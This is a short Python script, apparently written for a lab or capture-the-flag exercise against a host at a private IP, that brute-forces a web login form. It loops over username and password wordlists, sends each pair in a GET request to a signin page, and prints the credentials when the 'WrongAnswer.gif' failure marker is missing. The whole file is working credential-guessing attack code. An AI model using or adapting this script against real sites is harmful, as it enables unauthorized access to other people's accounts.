import urllib.request

ADDRESS = 'http://192.168.229.128/?page=signin&username={}&password={}&Login=Login#'
LOGINS = 'dic_pseudo.txt'
PASSWORDS = 'dic_mdp.txt'

with open(LOGINS) as f:
  list_logins = f.read().split('\n')

with open(PASSWORDS) as f:
  list_passwords = f.read().split('\n')

pass_len = len(list_passwords)
total = len(list_logins) * pass_len

for i1, login in enumerate(list_logins):
  for i2, password in enumerate(list_passwords):
    print("try {}/{}...".format((i1*pass_len + i2), total))
    r = urllib.request.urlopen(ADDRESS.format(login, password)).read().decode()
    if 'images/WrongAnswer.gif' not in r:
      print("Login: {}".format(login))
      print("Password: {}".format(password))
      exit()
